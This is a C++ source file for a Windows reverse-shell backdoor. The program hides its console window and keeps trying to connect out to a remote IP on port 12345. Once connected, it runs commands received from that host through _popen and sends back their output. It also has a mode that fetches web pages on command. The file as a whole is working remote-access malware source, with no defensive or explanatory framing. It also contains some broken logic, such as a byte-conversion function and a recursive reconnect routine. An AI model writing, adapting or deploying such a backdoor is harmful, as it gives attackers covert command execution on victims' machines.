#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <vector>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <Windows.h>

#pragma comment(lib, "ws2_32.lib")

#define DEFAULT_PORT "12345"
#define DEFAULT_BUFLEN 1024

#define HTTP_BUFFER 4096

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

void terminal(const char* command, std::vector<std::string>& out, int buffer_size, int& buffers) {
    out.clear();
    std::string res;
    res = exec(command);
    buffers = res.size() / buffer_size;
    buffers++;
    int l = 0;
    for (int i = 0; i < buffers; i++) {
        out.push_back(res.substr(l, buffer_size - 1));
        l += buffer_size;
    }
}

void convertIC(int a, char b[4]) {
    b[0] = (a >> 24) & 0xFF;
    b[1] = (a >> 16) & 0xFF;
    b[2] = (a >> 8) & 0xFF;
    b[3] = a & 0xFF;
}

void convertCI(char a[4], int& b) {
    b = 0;
    for (int i = 3; i >= 0; i--) {
        b += a[i];
    }
}

int listenForServer(int &result, SOCKET &connectSocket, struct addrinfo* &addrResult) {
    connectSocket = socket(addrResult->ai_family, addrResult->ai_socktype, addrResult->ai_protocol);

    if (connectSocket == INVALID_SOCKET) {
        //std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
        freeaddrinfo(addrResult);
        WSACleanup();
        return -1;
    }

    result = connect(connectSocket, addrResult->ai_addr, static_cast<int>(addrResult->ai_addrlen));
    if (result == SOCKET_ERROR) {
        Sleep(1000);
        listenForServer(result, connectSocket, addrResult);
    }
    else {
        return 0;
    }
}

class HttpConn {
private:
    SOCKET sock = SOCKET_ERROR;
    struct addrinfo* addr = nullptr;
    int addrResult = 0;
    int connectResult = 0;
    std::string httpRequest[2] = { "GET / HTTP/1.1\r\nHost: ", "\r\nConnection: close\r\n\r\n" };
    int sendResult = 0;
    const int bufferSize = DEFAULT_BUFLEN;
    char buffer[DEFAULT_BUFLEN];
    int bytesReceived = 0;
public:
    HttpConn(std::string url = "") {
        std::string request = httpRequest[0] + url + httpRequest[1];
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Socket creation failed" << std::endl;
            return;
        }

        addrResult = getaddrinfo(url.c_str(), "80", nullptr, &addr);
        if (addrResult != 0) {
            std::cerr << "getaddrinfo failed: " << addrResult << std::endl;
            closesocket(sock);
            return;
        }

        connectResult = connect(sock, addr->ai_addr, static_cast<int>(addr->ai_addrlen));
        if (connectResult == SOCKET_ERROR) {
            std::cerr << "Connection failed: " << WSAGetLastError() << std::endl;
            freeaddrinfo(addr);
            closesocket(sock);
            return;
        }
        freeaddrinfo(addr);

        sendResult = send(sock, request.c_str(), static_cast<int>(strlen(request.c_str())), 0);
        if (sendResult == SOCKET_ERROR) {
            std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
            closesocket(sock);
            return;
        }

        do {
            bytesReceived = recv(sock, buffer, bufferSize - 1, 0);
            if (bytesReceived > 0) {
                buffer[bytesReceived] = '\0';
                std::cout << buffer;
            }
            else if (bytesReceived == 0) {
                std::cout << "Connection closed by remote host" << std::endl;
            }
            else {
                std::cerr << "Receive failed: " << WSAGetLastError() << std::endl;
            }
        } while (bytesReceived > 0);
    }
    ~HttpConn() {
        closesocket(sock);
    }
};

void web(const char* command, std::vector<std::string>& out, int buffer_size, int& buffers) {
    out.clear();
    char* ohttp = strstr((char*)command, "http:");
    /*if (chmod != 0) {
        mode = chmod + strlen("mode: ");
        sendBuffers[0] = "Mode changed to " + mode + "\n";
    }*/
    if (strcmp(command, "echo") == 0) {
        buffers = 1;
        out.push_back("echo\n");
        return;
    }
    else if (ohttp != 0) {
        HttpConn httpconn = HttpConn(ohttp + std::to_string(strlen("http:")));
    }
    else {
        buffers = 1;
        out.push_back("error\n");
        return;
    }
}

int main(int argc, char** argv) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    char* ipaddress = (char*)"127.0.0.1";

    if (argc > 1) {
        ipaddress = argv[1];
    }

    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        //std::cerr << "WSAStartup failed with error: " << result << std::endl;
        return 1;
    }

    struct addrinfo* addrResult = nullptr;
    struct addrinfo hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    result = getaddrinfo(ipaddress, DEFAULT_PORT, &hints, &addrResult);
    
    if (result != 0) {
        //std::cerr << "getaddrinfo failed with error: " << result << std::endl;
        WSACleanup();
        return 1;
    }

    SOCKET connectSocket;

    bool listenS = true;

    while (listenS) {
        int ls = listenForServer(result, connectSocket, addrResult);
        if (ls == -1) {
            return 0;
        }

        bool quit = false;
        int recvResult;
        char recvBuffer[DEFAULT_BUFLEN];
        std::vector<std::string> sendBuffers;
        int buffers = 1;
        std::string mode = "null";

        while (!quit) {
            buffers = 1;
            sendBuffers.clear();
            sendBuffers.push_back("error\n");

            recvResult = recv(connectSocket, recvBuffer, DEFAULT_BUFLEN, 0);
            if (recvResult > 0) {
                int i = 0;
                if (strcmp(recvBuffer, "exit") == 0) {
                    closesocket(connectSocket);
                    WSACleanup();
                    return 0;
                }
                
                char* chmod = strstr(recvBuffer, "mode: ");
                if (chmod != 0) {
                    mode = chmod + strlen("mode: ");
                    sendBuffers[0] = "Mode changed to " + mode + "\n";
                }
                else {
                    if (mode == "cmd" && strcmp(recvBuffer, "cmd") != 0) {
                        sendBuffers.clear();
                        terminal(recvBuffer, sendBuffers, DEFAULT_BUFLEN, buffers);
                    }
                    else if (mode == "web") {
                        sendBuffers.clear();
                        web(recvBuffer, sendBuffers, DEFAULT_BUFLEN, buffers);
                    }
                }  
            }
            else if (recvResult == 0) {
                //std::cout << "Connection closed by server" << std::endl;
                quit = true;
            }
            else {
                int error = WSAGetLastError();
                if (error == 10054) {
                    quit = true;
                    break;
                }
                else {
                    //std::cerr << "Recv failed with error: " << error << std::endl;
                    quit = true;
                    return 1;
                }
            }

            char buffs[4];
            convertIC(buffers, buffs);
            convertCI(buffs, buffers);
            //std::cout << buffers << std::endl;
            result = send(connectSocket, buffs, 4, 0);

            if (result == SOCKET_ERROR) {
                //std::cerr << "send failed with error: " << WSAGetLastError() << std::endl;
                closesocket(connectSocket);
                WSACleanup();
                return 1;
            }

            for (int i = 0; i < buffers; i++) {
                char sendBuffer[DEFAULT_BUFLEN];
                strcpy_s(sendBuffer, sendBuffers[i].c_str());
                //std::cout << sendBuffers[i].c_str() << char(219) << char(178) << char(177);
                result = send(connectSocket, sendBuffer, DEFAULT_BUFLEN, 0);
            }
            sendBuffers.clear();

            if (result == SOCKET_ERROR) {
                //std::cerr << "send failed with error: " << WSAGetLastError() << std::endl;
                closesocket(connectSocket);
                WSACleanup();
                return 1;
            }
        }

        result = shutdown(connectSocket, SD_SEND);
        if (result == SOCKET_ERROR) {
            //std::cerr << "shutdown failed with error: " << WSAGetLastError() << std::endl;
            closesocket(connectSocket);
            WSACleanup();
            return 1;
        }
    }

    closesocket(connectSocket);
    freeaddrinfo(addrResult);
    WSACleanup();

    return 0;
}